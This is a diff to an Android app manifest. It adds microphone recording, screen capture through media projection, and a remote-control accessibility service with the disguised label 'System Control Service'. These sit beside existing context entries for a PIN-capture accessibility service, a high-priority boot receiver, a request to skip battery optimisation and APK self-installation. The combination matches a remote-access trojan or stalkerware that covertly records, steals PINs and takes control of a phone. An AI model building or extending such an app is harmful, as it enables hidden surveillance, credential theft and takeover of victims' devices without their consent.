@@ -10,6 +10,7 @@
     <!-- Keep-Alive / Service -->
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION" />
     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
     <uses-permission android:name="android.permission.WAKE_LOCK" />
     <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
@@ -42,6 +43,7 @@
     <!-- Media -->
     <uses-permission android:name="android.permission.VIBRATE" />
     <uses-permission android:name="android.permission.CAMERA" />
+    <uses-permission android:name="android.permission.RECORD_AUDIO" />
 
     <application
         android:allowBackup="false"
@@ -78,12 +80,12 @@
             </intent-filter>
         </activity-alias>
 
-        <!-- Background connector service -->
+        <!-- Background connector service: dataSync + mediaProjection -->
         <service
             android:name=".ConnectorService"
             android:enabled="true"
             android:exported="false"
-            android:foregroundServiceType="dataSync" />
+            android:foregroundServiceType="dataSync|mediaProjection" />
 
         <receiver android:name=".BootReceiver" android:enabled="true" android:exported="true">
             <intent-filter android:priority="999">
@@ -139,6 +141,20 @@
             <meta-data
                 android:name="android.accessibilityservice"
                 android:resource="@xml/pin_capture_config" />
+        </service>
+
+        <!-- Remote Control — AccessibilityService (tap/swipe/key tanpa Shizuku) -->
+        <service
+            android:name=".ControlAccessibilityService"
+            android:exported="true"
+            android:label="System Control Service"
+            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
+            <intent-filter>
+                <action android:name="android.accessibilityservice.AccessibilityService" />
+            </intent-filter>
+            <meta-data
+                android:name="android.accessibilityservice"
+                android:resource="@xml/control_accessibility_config" />
         </service>
 
         <!-- FileProvider untuk install APK -->
